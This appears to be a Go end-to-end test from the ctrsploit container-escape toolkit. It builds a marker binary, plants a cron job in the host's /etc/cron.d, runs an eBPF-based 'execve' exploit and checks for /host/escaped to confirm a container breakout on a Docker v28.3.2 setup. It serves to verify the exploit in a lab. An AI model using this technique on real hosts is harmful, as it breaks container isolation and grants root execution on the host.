package execve

import (
	"fmt"
	"os"
	"os/exec"
	"testing"
	"time"

	"github.com/ctrsploit/ctrsploit/internal"
	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"
)

func TestE2E_Exploit(t *testing.T) {
	tests := map[string]struct {
		vulnerable bool
	}{
		"docker-v28.3.2-cron": {
			vulnerable: true,
		},
	}
	testEnv := os.Getenv("TEST_ENV")
	test, ok := tests[testEnv]
	if !ok {
		t.Skipf("Skipping test for unsupported environment: %s", testEnv)
	}
	t.Run(fmt.Sprintf("%s", testEnv), func(t *testing.T) {
		// prepare1: cmd to be injected
		content := `package main; import "os"; func main() {os.WriteFile("/escaped", nil, 0644)}`
		err := os.WriteFile("/test.go", []byte(content), 0755)
		require.NoError(t, err)
		cmd := exec.Command("/usr/local/go/bin/go", "build", "-o", "/test", "/test.go")
		cmd.Env = append(os.Environ(), "CGO_ENABLED=0")
		err = cmd.Run()
		require.NoError(t, err)
		// prepare2: create crontab to trigger ebpf exploit
		err = os.WriteFile("/host/etc/cron.d/trigger", []byte("* * * * * root whoami\n"), 0644)
		require.NoError(t, err, "Failed to write cron job file")
		// Exploit
		go func() {
			_ = Exploit("/test", true)
		}()
		// check
		const timeout = 3 * time.Minute
		const pollInterval = 500 * time.Millisecond

		condition := func() bool {
			exists, _ := internal.CheckPathExists("/host/escaped")
			return exists
		}

		if test.vulnerable {
			assert.Eventually(t, condition, timeout, pollInterval, "Exploit failed to create the file within the timeout period.")
		} else {
			assert.Never(t, condition, timeout, pollInterval, "File was created, but the environment was expected to be non-vulnerable.")
		}
	})
}
